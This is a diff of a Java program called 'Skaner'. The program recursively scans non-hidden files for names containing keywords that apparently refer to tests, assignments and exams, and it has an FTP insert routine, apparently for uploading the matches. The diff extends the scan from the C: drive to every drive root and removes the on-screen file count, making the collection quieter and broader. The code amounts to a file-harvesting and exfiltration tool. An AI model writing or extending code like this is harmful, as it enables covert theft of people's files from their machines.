@@ -20,12 +20,25 @@ public class Skaner {
 static List<File> dir = new ArrayList<File>();
 static List<File> file = new ArrayList<File>();
 static String tab[] = {"kol","zad","kom","egz","zal"};
-static public void scanDrive()
-{   int i=0;
+static public void scanDrive(String name)
+{   
+    int i=0;
+    File[] files = new File(name).listFiles();
+    if (files != null )
+    {
+       for ( File element : files)    
+       {   
+            if(element.isHidden()==false)
+            {   
+                if(element.isDirectory()) dir.add(element);
+                else file.add(element);
+            }
+        } 
+    }
     try{
         while(i!=dir.size())
         {  
-            File[] files = new File(dir.get(i).getPath()).listFiles();
+            files = new File(dir.get(i).getPath()).listFiles();
             if (files != null )
             {
                 for ( File element : files)
@@ -60,6 +73,18 @@ static void findFile()
             }
         }
 }
+static void findLetters()
+{
+    File[] roots = File.listRoots();
+    for(int i = 0; i < roots.length ; i++)
+    {
+        scanDrive(roots[i].getPath());
+        findFile();
+        dir.clear();
+        file.clear();
+    }
+    
+}
 static void insert(String path, String name)
 {
     FTPClient client = new FTPClient();
@@ -88,19 +113,8 @@ static void insert(String path, String name)
 }
     public static void main(String[] args) throws FileNotFoundException {
     
-        File[] files = new File("C:\\").listFiles();
-        
-            for ( File element : files)    
-            {   if(element.isHidden()==false)
-                {   
-                    if(element.isDirectory()) dir.add(element);
-                    else file.add(element);
-                }
-            }
-         scanDrive();
-         findFile();
-       
-         System.out.println(file.size());
+         findLetters();
+         
        
     }
 }
